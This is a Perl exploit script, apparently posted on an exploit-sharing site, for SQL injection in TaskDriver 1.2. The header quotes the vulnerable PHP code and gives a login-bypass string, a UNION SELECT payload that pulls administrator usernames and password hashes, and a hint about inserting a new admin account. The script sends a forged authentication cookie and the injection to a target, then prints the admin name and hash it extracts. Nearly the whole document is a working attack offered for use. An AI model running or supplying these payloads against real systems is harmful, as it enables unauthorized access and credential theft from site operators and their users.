#!/usr/bin/perl -w

#################################################################################
#										#
#	      TaskDriver <= 1.2 Login Bypass/SQL Injection Exploit		#
#										#
# Discovered by: Silentz							#
# Payload: Login Bypass & Admin Username & Hash Retrieval			#
# Website: http://www.w4ck1ng.com						#
# 										#
# Vulnerable Code (login.php): 							#
#										#
# $sql = "SELECT * FROM  $userstable WHERE username = '$_POST[username]' AND    #
#         password = md5('$_POST[password]')";					#
#										#
# Vulnerable Code (notes.php):							#
#       									#
# $taskid = $_GET['taskid'];							#
# $sql = "SELECT * FROM $taskstable WHERE taskid = '$taskid'";			#
#										#
# PoC: http://victim.com/login.php						#
#      In username box input: ' OR 1=1 /*					#
#      In password box: [ANYTHING OR NOTHING]					#
#										#
#      OR: 									#
#										#
#      http://victim.com/notes.php?taskid=-999' UNION SELECT 0,0,username,      #
#      0,0,0,0,0,0,0,0,0,password FROM users WHERE userlevel='a' /*		#
# 										#
# Subject To: magic_quotes_gpc set to off					#
# GoogleDork: Get your own!							#
# Notes: You can do a UNION INSERT in the password reset form to add an admin	#
#										#
# Shoutz: The entire w4ck1ng community						#
#										#
#################################################################################

use LWP::UserAgent;
if (@ARGV < 1){
print "-------------------------------------------------------------------------\r\n";
print "           TaskDriver <= 1.2 Login Bypass/SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "Usage: w4ck1ng_taskdriver.pl [PATH]\r\n\r\n";
print "[PATH] = Path where TaskDriver is located\r\n\r\n";
print "e.g. w4ck1ng_taskdriver.pl http://victim.com/taskdriver/\r\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
exit();
}

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$cookie = "fook%21%27+or+1%3D1+%2F%2A;";
$host = $ARGV[0] . "notes.php?taskid=-999' UNION SELECT 0,0,username,0,0,0,0,0,0,0,0,0,password FROM users WHERE userlevel='a' /*";

my @cookie = ('Cookie' => "auth=$cookie;");
my $res = $b->get($host, @cookie);

$answer = $res->content;
if ($answer =~ /notes on (.*?)<\/u><\/td><\/tr>/){
print "-------------------------------------------------------------------------\r\n";
print "            TaskDriver <= 1.2 Login Bypass/SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "[+] Admin User : $1\n";
}

if ($answer =~/([0-9a-fA-F]{32})<\/font>/){
print "[+] Admin Hash : $1\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
}